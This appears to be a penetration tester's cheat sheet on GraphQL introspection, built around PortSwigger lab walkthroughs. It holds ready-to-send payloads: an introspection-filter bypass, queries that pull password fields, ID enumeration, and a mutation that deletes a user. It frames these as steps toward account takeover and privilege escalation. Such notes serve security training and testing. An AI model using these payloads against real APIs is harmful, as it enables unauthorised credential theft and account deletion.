# GraphQL — Introspection and enumeration

GraphQL's `__schema` introspection query returns the full type system including all fields, even those not shown in the UI (passwords, hidden posts, admin functions). Introspection "disabled" can often be bypassed with whitespace tricks. Once enumerated, craft queries to access the hidden fields directly.

## Quick reference
```graphql
# Universal probe
{"query":"{__typename}"}

# Full introspection (Burp: right-click → GraphQL → Set introspection query)
{"query":"query IntrospectionQuery { __schema { queryType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated:true) { name type { ...TypeRef } } } fragment TypeRef on __Type { kind name ofType { kind name } }"}

# Bypass __schema block (add newline after __schema)
{"query":"query{__schema\n{queryType{name}}}"}

# Access hidden field once found
{"query":"{getBlogPost(id:3){title postPassword}}"}

# Enumerate users (try id 0,1,2,3...)
{"query":"{getUser(id:1){username password}}"}
```

## Root cause
Introspection is enabled by default in most GraphQL implementations. Schema includes all types including sensitive ones (passwords, admin operations). Developers may block `__schema{` literally but forget that whitespace inside the query is valid — `__schema\n{` evades simple regex.

## Find it
1. Identify GraphQL endpoint: probe common paths `/graphql`, `/api`, `/graphql/v1`.
2. Send `{"query":"{__typename}"}` → if `{"data":{"__typename":"query"}}` → GraphQL confirmed.
3. Send introspection → inspect for sensitive types/fields (`password`, `secret`, `admin`, `token`).
4. If introspection blocked → try `\n` inside `__schema\n{`.
5. In Burp: right-click → "GraphQL → Save GraphQL queries to site map" → browse schema.

## Technique
**Accessing private fields (hidden blog post):**
1. Observe blog posts have sequential IDs but #3 is missing → hidden.
2. Run introspection → BlogPost type has `postPassword` field not shown in UI.
3. Send: `{getBlogPost(id:3){title postPassword}}` → response includes password.

**Accidental exposure (admin credentials):**
1. Introspection reveals `getUser` query returning `username` AND `password`.
2. Try `{getUser(id:1){username password}}` → returns administrator credentials.
3. Log in as administrator → admin panel → delete carlos.

**Hidden GraphQL endpoint:**
1. Probe `/api` with GET → "Query not present" → GraphQL endpoint exists.
2. `GET /api?query=query{__typename}` → confirms GraphQL.
3. Introspection blocked → add newline: `GET /api?query=query{__schema%0a{queryType{name}...}}`.
4. Full schema returned → find `deleteOrganizationUser` mutation.
5. `{getUser(id:3){username}}` → carlos is id=3.
6. `mutation{deleteOrganizationUser(input:{id:3}){user{id}}}` → deleted.

## Labs

### Accessing private GraphQL posts [Apprentice]
Blog post id=3 missing. Introspection reveals `postPassword` field on BlogPost. Query `getBlogPost(id:3)` with `postPassword` field → returns the password. Key insight: introspection exposes all fields regardless of UI visibility.

### Accidental exposure of private GraphQL fields [Practitioner]
`getUser` query returns both `username` and `password`. Try id=1 → administrator credentials exposed. Log in → admin panel → delete carlos. Key insight: developers forgot to restrict sensitive fields; introspection makes them discoverable.

### Finding a hidden GraphQL endpoint [Practitioner]
`/api` responds to GET with GraphQL. Introspection blocked (filters `__schema{`); bypass with `__schema\n{` (newline). Schema reveals `deleteOrganizationUser` mutation. Find carlos (id=3) → delete. Key insight: simple regex blocks on introspection are bypassed with whitespace.

## Payload arsenal
```
# Confirm endpoint
GET /api?query=query{__typename}
# Standard introspection
{"query":"query{__schema{queryType{name} types{name fields{name}}}}"}
# Bypass introspection filter (newline after __schema)
/api?query=query+IntrospectionQuery+{__schema%0a{queryType{name}types{...FullType}}}
# Access a hidden field once discovered
{"query":"{ getBlogPost(id:3){ id title postPassword } }"}
# Pull credentials by id
{"query":"{ getUser(id:1){ username password } }"}
```

## Chaining
- Schema → hidden field (`postPassword`/`password`) → **data exfil / ATO** ([objectives: ATO](../../references/objectives-attack-trees.md)).
- Schema → IDOR via `getUser(id)`/`node(id)` → **mass PII** ([Access-control](../../Access-control/)).
- Schema → privileged mutation (`deleteOrganizationUser`, `updatePermissions`) → **privesc** ([objectives: Privesc](../../references/objectives-attack-trees.md)).

## Real-world notes
- Introspection enabled in production is a direct API documentation dump — always run it first.
- `__schema\n{` bypass works against many regex-based defenses.
- Always enumerate IDs (0,1,2,3,...) on any getUser-style query — IDOR via GraphQL.

## References
- https://portswigger.net/web-security/graphql
